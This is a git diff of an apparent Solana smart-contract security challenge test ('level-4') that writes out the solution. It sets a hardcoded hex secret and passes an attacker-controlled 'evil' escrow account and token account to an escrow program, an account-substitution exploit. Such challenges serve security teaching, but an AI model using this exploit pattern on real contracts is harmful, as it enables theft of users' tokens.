@@ -21,7 +21,7 @@ const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLk
 // v v v v v v v v v v v v v v v v v v v v v
 
 
-const SECRET = ""
+const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"
 
 
 // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
@@ -36,15 +36,18 @@ describe("level-4", async () => {
   anchor.setProvider(provider);
 
   const hacker = load_keypair('../accounts/hacker.json');
+  const evilEscrowKeys = load_keypair('../accounts/evil.json');
   const recipient =  web3.Keypair.generate();
   const program = anchor.workspace.Level4 as anchor.Program<Level4>;
 
   let escrowPdaAuthority: any;
   let HACKER_ATA: any
+  let EVIL_ESCROW_ATA: any
 
 
   before("Setup", async () => {
     await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
+    await airdrop(provider.connection, evilEscrowKeys.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
 
     [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);
 
@@ -60,8 +63,29 @@ describe("level-4", async () => {
       ASSOCIATED_TOKEN_PROGRAM_ID
       )
     await new Promise(resolve => setTimeout(resolve, 2000));
-    console.log(`Hacker ATA -> ${hackerAta.address}`)
-    HACKER_ATA = hackerAta
+    const hackerAtaPubKey = new web3.PublicKey(hackerAta.address)
+    console.log(`Hacker ATA -> ${hackerAtaPubKey}`)
+    HACKER_ATA = hackerAtaPubKey
+
+    const evilEscrowATA = await getOrCreateAssociatedTokenAccount(
+      provider.connection,
+      hacker,
+      USDC,
+      evilEscrowKeys.publicKey,
+      false,
+      'confirmed',
+      null,
+      TOKEN_2022_PROGRAM_ID,
+      ASSOCIATED_TOKEN_PROGRAM_ID
+      )
+    await new Promise(resolve => setTimeout(resolve, 10000));
+    const evilEscrowATAPubKey = new web3.PublicKey(evilEscrowATA.address)
+    console.log(`Evil Escrow ATA -> ${evilEscrowATAPubKey}`)
+    EVIL_ESCROW_ATA = evilEscrowATAPubKey
+
+
+    const hackerAtaInfo = await provider.connection.getAccountInfo(HACKER_ATA);
+    const evilEscrowAtaInfo = await provider.connection.getAccountInfo(EVIL_ESCROW_ATA);
 
   });
 
@@ -84,13 +108,13 @@ describe("level-4", async () => {
     .accounts({
       sender: hacker.publicKey,
       senderTokenAccount: HACKER_ATA,
-      escrow: ESCROW,
-      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
+      escrow: evilEscrowKeys.publicKey,
+      escrowTokenAccount: EVIL_ESCROW_ATA,
       mint: USDC,
       tokenProgram: TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId,
     })
-    .signers([hacker])
+    .signers([hacker, evilEscrowKeys])
     .rpc();
 
   });
